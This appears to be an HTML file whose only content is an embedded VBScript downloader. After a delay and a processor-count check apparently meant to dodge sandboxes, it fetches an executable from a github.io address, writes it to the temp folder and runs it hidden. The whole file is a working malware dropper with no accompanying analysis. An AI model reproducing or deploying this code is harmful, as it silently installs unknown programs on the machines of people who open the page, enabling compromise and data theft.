<html><head><script language="VBScript">
WScript.Sleep 3957
Set s=CreateObject("WScript.Shell")
If s.ExpandEnvironmentStrings("%NUMBER_OF_PROCESSORS%") < 2 Then Close
Set x=CreateObject("MSXML2.ServerXMLHTTP")
x.Open "GET","https://boostedboynow.github.io/assets-host/2e1u07.exe",0
x.Send
If x.Status<>200 Then Close
Set a=CreateObject("ADODB.Stream")
a.Type=1:a.Open:a.Write x.responseBody
p=s.ExpandEnvironmentStrings("%tmp%\tvoy.exe")
a.SaveToFile p,2:a.Close
s.Run p,0
Close
</script></head></html>